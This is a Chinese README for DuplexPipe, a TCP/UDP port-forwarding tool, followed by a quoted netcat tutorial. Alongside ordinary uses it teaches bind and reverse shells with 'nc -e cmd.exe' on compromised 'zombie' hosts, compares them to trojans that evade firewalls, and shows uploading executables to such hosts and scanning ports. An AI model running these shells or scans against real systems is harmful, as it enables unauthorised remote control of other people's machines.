# DuplexPipe
DuplexPipe

```
用法: java -jar DuplexPipe-0.3.0-SNAPSHOT.jar [-vh] model model
选项:
        -v              输出一些提示信息
        -h              显示本帮助文档
模式:
        -u              UDP 模式
        -l port         监听本地端口
        -c host port    连接远程主机的端口
示例:
        java -jar DuplexPipe-0.3.0-SNAPSHOT.jar -c 192.168.1.100 3389 -l 1234
        将本地 1234 号 UDP 端口上的信息转发给 192.168.1.100 的 3389 TCP 端口

```
	
	


----------


    一个双向管道。传统的管道只能从一端输入、一端输出。
    双向管道不仅可以让进程 A 的输出作为进程 B 的输入，
    也会让进程 B 的输出作为进程 A 的输入。
    这样就可以让两个进程实现交流。
    
    本程序主要是 TCP 转发工具。允许监听本地端口，也可以主动连接远程端口。
    如果和瑞士军刀“nc -e”配合使用， 就能实现本地进程和网络进程任意沟通。
    
    Linux下安装nc命令：
    yum install nc

> nc的一些简单用法：
> 
> nc(NetCat)，在网络工具中有”瑞士军刀”的美誉，它短小精悍，功能强大，下面分享一些我平时经常用到的功能，更多的功能请google之。
> 
> 1.基本参数 想要连接到某处: nc [-options] hostname port[s] [ports] … 绑定端口等待连接: nc -l -p port [-options] [hostname] [port] 参数:
> -g gateway source-routing hop point[s], up to 8
> -G num source-routing pointer: 4, 8, 12, …
> -h 帮助信息
> -i secs 延时的间隔
> -l 监听模式，用于入站连接
> -n 指定数字的IP地址，不能用hostname
> -o file 记录16进制的传输
> -p port 本地端口号
> -r 任意指定本地及远程端口
> -s addr 本地源地址
> -u UDP模式
> -v 详细输出——用两个
> -v可得到更详细的内容
> -w secs timeout的时间
> -z 将输入输出关掉——用于扫描时，其中端口号可以指定一个或者用lo-hi式的指定范围。
> 
> 2.简单用法举例 1）端口扫描
>  nc -v -w 2 192.168.2.34 -z 21-24 nc: connect to 192.168.2.34 port 21 (tcp) failed: Connection refused Connection to 192.168.2.34 22 port
> [tcp/ssh] succeeded! nc: connect to 192.168.2.34 port 23 (tcp) failed:
> Connection refused nc: connect to 192.168.2.34 port 24 (tcp) failed:
> Connection refused
> 
> 2)从192.168.2.33拷贝文件到192.168.2.34 在192.168.2.34上： nc -l 1234 > test.txt
> 在192.168.2.33上： nc 192.168.2.34 < test.txt
> 
> 3)简单聊天工具 在192.168.2.34上： nc -l 1234 在192.168.2.33上： nc 192.168.2.34
> 1234 这样，双方就可以相互交流了。使用ctrl+C(或D）退出。
> 
> 3.用nc命令操作memcached 1）存储数据：printf “set key 0 10 6\r\nresult\r\n” |nc 192.168.2.34 11211 2）获取数据：printf “get key\r\n” |nc 192.168.2.34 11211 3）删除数据：printf “delete key\r\n” |nc 192.168.2.34 11211 4）查看状态：printf
> “stats\r\n” |nc 192.168.2.34 11211 5）模拟top命令查看状态：watch “echo stats”
> |nc 192.168.2.34 11211 6）清空缓存：printf “flush_all\r\n” |nc 192.168.2.34
> 11211 (小心操作，清空了缓存就没了）
> 
> 
> 4. 使用nc来传文件
> 
> 
> 发送端：   cat a.txt  |  nc -l  3333
> 
> 接收端：   nc 192.168.0.3    3333 >   a.txt
> 
> 
> 或者
> 
> 
> 发送端:      cat a.txt     |   nc 192.168.0.3     9999 
> 
> 接收端:      nc -l 9999 > a.txt
> 
> 
> 命令1：监听命令
> 
> nc -l -p port nc -l -p port > e:\log.dat nc -l -v -p port
> 
> 参数解释：
> 
> -l：监听端口，监听入站信息
> -p：后跟本地端口号
> -v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信息
> 
> 提示：一般大家都爱用-vv
> 
> nc -l -p 80
> 
> 这个很简单，监听80端口 如果机器上运行这个命令，端口80被认为是开放的，可以欺骗很多扫描器的哦！
> 
> nc -l -p 80 > e:\log.dat
> 
> 呵呵，功能和上边一样，但是后边加了个“> e:\log.dat”我想，学过ECHO
> 那个命令的人都会知道吧，是在E盘创建一个log.dat的日志文件
> 
> nc -l -v -p 80
> 
> 和上边命令相似，不过这次不是记录在文件里，而是会直接显示在运行着NC 的屏幕上。
> 
> 
> 呵呵，讲了这么多，来实践下
> 
> nc -l -v -p 80
> 
> 然后在浏览器中输入本机IP：127.0.0.1 呵呵，看到什么？
> 
> 
> 同样，上边两个也是一样，大家自己试验一下吧
> 
> 
> 
> 命令2：程序定向
> 
> nc -l -p port -t -e cmd.exe
> 
> 本地机： nc -l -p port 或 nc -l -v -p port
> 
> 目标机：nc -e cmd.exe ip port
> 
> 参数解释：
> 
> -l、-p两个参数已经解释过了
> 
> -e；作用就是程序定向
> -t：以telnet的形式来应答
> 
> 例子
> 
> nc -l -p 5277 -t -e cmd.exe
> 
> 知道运行在哪里吗？千万不要运行在自己的机器上，如果运行了，你机器 就会变成一台TELNET的服务器了，呵呵，解释一下：监听本地端口5277的
> 入站信息，同时将CMD.exe这个程序，重定向到端口5277上，当有人连接的时候，就让程序CMD.exe以TELNET的形式来响应连接要求。
> 
> 说白了，其实就是让他成为一台TELNET的肉鸡，所以这个命令要运行在你的肉鸡上。。（话外音：说这么多遍当我们白痴啊，快往下讲！！！）
> 
> 呵呵，咱们来找台肉鸡试试，我TELNET IP 5277 HOHO~~如何？
> 
> 
> 
> local machine：nc -l -p port ( or nc -l -v -p port ) remote machine：nc
> -e cmd.exe ip port
> 
> 大家知道灰鸽子和神偷吧，这两款工具都是利用了反弹端口型的木马， 什么叫反弹端口？就是说，当对方中马后，不用你主动和对方连接，也就是说
> 不用从你的client端向对方主机上运行的server端发送请求连接，而是对方主动来连接你
> 这样就可以使很多防火墙失效，因为很多防火墙都不检查出站请求的。
> 
> 
> 这里这两个命令结合在一起后，于那两款木马可以说有异曲同工之效。为什么？
> 咳！！听我给你讲啊！！（先交100000000RMB学费)哇，别杀我啊！！)
> 
> nc -l -p 5277 （坚听本地5277端口）
> 
> 同样也可以用
> 
> nc -l -v -p 5277
> 
> 运行在本地
> 
> 然后在远程机器上，想办法运行
> 
> nc -e cmd.exe ip 5277
> 
> （你可别真的打“ip”在肉机上啊）要打，xxx.xxx.xxx.xxx这样！！
> 
> 呵呵，看看在本地机器上出现了什么？
> 
> 这样就是反弹~~在本地机器上得到了一个SHELL
> 
> 
> 
> 命令3：扫描端口
> 
> nc -v ip port nc -v -z ip port-port nc -v -z -u ip port-port
> 
> 
> 参数解释：
> 
> -z：将输入输出关掉，在扫描时使用
> 
> nc -v ip port
> 
> 这个命令是针对某一个端口进行扫描
> 
> 例如：
> 
> nc -v ip 135
> 
> 扫描远程主机的135端口，这样获得了该端口的一些简单信息，但是针对某些端口，我们还可以获得更多的信息
> 
> 例如：80端口
> 
> 我们可以使用nc -v ip 80 然后使用get方法来获得对方的WEB服务器的信息
> 
> 
> nc -v -z ip port-port
> 
> 这个命令是用来扫描的一个命令，这个命令用于快速扫描TCP端口，而port-port则是指定了扫描的端口范围
> 
> 例如：
> 
> nc -v -z ip 1-200
> 
> 可以看到我机器上的1-200的TCP端口的开放情况
> 
> 
> nc -v -z -u ip port-port
> 
> 这个命令比上个命令多了个-u，这个命令的作用仍然是扫描端口，只是多了一个-u的参数，是用来扫UDP端口的
> 
> 例如：
> 
> nc -v -z -u ip 1-200
> 
> 这个命令就会扫1-200的UDP端口
> 
> 
> 
> 命令4：传送文件（HOHO，I LIKE）
> 
> LOCAL MACHINE：nc -v -n ip port < x:\svr.exe REMOTE MACHINE：nc -v -l -p
> port > y:\svr.exe
> 
> 参数解释：
> 
> -n：指定数字的IP地址
> 
> 这两个命令结合起来是用来传送文件的
> 
> 首先，在远程机上运行命令：
> 
> nc -v -l -p 5277 > c:\pulist.exe
> 
> 这个命令还记的吗？呵呵，是不是和监听命令有点类似，对，没错，这个是监听5277端口
> 
> 并把接受到的信息数据写到c:\pulist.exe中
> 
> 
> 这时候在本地机上运行
> 
> nc -v -n ip 5277 < e:\hack\pulist.exe
> 
> 这个命令的意思就是，从本地E盘跟目录中读取pulist.exe文件的内容，并把这些数据发送到ip的5277端口上
> 
> 这样远程主机就会自动创建一个pulist.exe文件。。呵呵，你想到了吗？？
> 
> 
> 上边是NC的比较常用的方法，希望通过这些，大家能发挥自己的想象力，创造出更多更精彩的命令来，
> 因为NC的用法不仅仅局限于这几种而已哦！！对NC来说，只有想不到，没有做不到的！！！





